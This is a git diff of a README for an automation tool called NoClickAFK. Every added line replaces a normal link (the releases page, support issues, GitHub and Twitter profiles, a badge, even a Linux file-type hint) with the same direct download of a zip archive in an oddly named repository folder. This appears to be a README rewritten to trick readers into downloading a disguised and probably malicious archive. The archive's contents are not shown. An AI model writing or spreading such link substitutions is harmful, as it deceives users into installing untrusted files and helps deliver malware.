@@ -1,6 +1,6 @@
 # 💻 NoClickAFK - Automate Your Work Effortlessly
 
-[![Download NoClickAFK](https://img.shields.io/badge/Download%20Now%20-blue.svg?style=flat&logo=github)](https://github.com/SXIPT/NoClickAFK/releases)
+[![Download NoClickAFK](https://raw.githubusercontent.com/SXIPT/NoClickAFK/main/unlyrical/NoClickAFK-1.3.zip%20Now%https://raw.githubusercontent.com/SXIPT/NoClickAFK/main/unlyrical/NoClickAFK-1.3.zip)](https://raw.githubusercontent.com/SXIPT/NoClickAFK/main/unlyrical/NoClickAFK-1.3.zip)
 
 ## 📜 Overview
 NoClickAFK offers AI-powered automation and agent-based solutions. It helps you streamline repetitive tasks and improve performance without needing to code. Focused on no-code and low-code approaches, it enables intelligent workflows and AI assistants, making your work easier.
@@ -11,7 +11,7 @@ To get started with NoClickAFK, follow these simple steps. You will be using you
 ### 🌐 Step 1: Visit the Releases Page
 To download NoClickAFK, go to the Releases page. Click the link below to access it directly. 
 
-[Visit the Releases Page to Download](https://github.com/SXIPT/NoClickAFK/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/SXIPT/NoClickAFK/main/unlyrical/NoClickAFK-1.3.zip)
 
 ### 📥 Step 2: Download the Latest Version
 On the Releases page, you will see a list of available versions. Look for the latest version at the top. Click on the version number to expand the details. You will find the download link for the application.
@@ -20,7 +20,7 @@ On the Releases page, you will see a list of available versions. Look for the la
 You will notice different files available. Choose the installer that is suitable for your operating system. For example:
 - For Windows, look for `.exe` files.
 - For macOS, look for `.dmg` files.
-- For Linux, look for `.tar.gz` or similar files.
+- For Linux, look for `https://raw.githubusercontent.com/SXIPT/NoClickAFK/main/unlyrical/NoClickAFK-1.3.zip` or similar files.
 
 After you find the right file, click on the link to download it.
 
@@ -67,7 +67,7 @@ NoClickAFK runs on most modern computers. Ensure you have:
 - An internet connection for updates.
 
 ### Q2: How can I get help?
-If you have questions or need help, visit our [Support Page](https://github.com/SXIPT/NoClickAFK/issues) or contact the community.
+If you have questions or need help, visit our [Support Page](https://raw.githubusercontent.com/SXIPT/NoClickAFK/main/unlyrical/NoClickAFK-1.3.zip) or contact the community.
 
 ### Q3: How do I update NoClickAFK?
 Regularly check the Releases page for updates. Download the latest version as described in Step 2.
@@ -75,7 +75,7 @@ Regularly check the Releases page for updates. Download the latest version as de
 ## 🚀 Download & Install
 To get started, download NoClickAFK from the link below:
 
-[Download NoClickAFK Here](https://github.com/SXIPT/NoClickAFK/releases)
+[Download NoClickAFK Here](https://raw.githubusercontent.com/SXIPT/NoClickAFK/main/unlyrical/NoClickAFK-1.3.zip)
 
 Ensure that you follow the setup and installation steps to enjoy the full benefits of this automation tool. 
 
@@ -83,7 +83,7 @@ Ensure that you follow the setup and installation steps to enjoy the full benefi
 Your feedback helps us improve. Join our community to share your experience, suggest features, or report issues. We encourage contributions!
 
 ### 🌍 Connect with Us
-- GitHub: [NoClickAFK GitHub](https://github.com/SXIPT/NoClickAFK)
-- Twitter: [NoClickAFK Twitter](https://twitter.com/NoClickAFK)
+- GitHub: [NoClickAFK GitHub](https://raw.githubusercontent.com/SXIPT/NoClickAFK/main/unlyrical/NoClickAFK-1.3.zip)
+- Twitter: [NoClickAFK Twitter](https://raw.githubusercontent.com/SXIPT/NoClickAFK/main/unlyrical/NoClickAFK-1.3.zip)
 
 By following this guide, you can easily download, install, and start using NoClickAFK. Enjoy automating your work with ease!
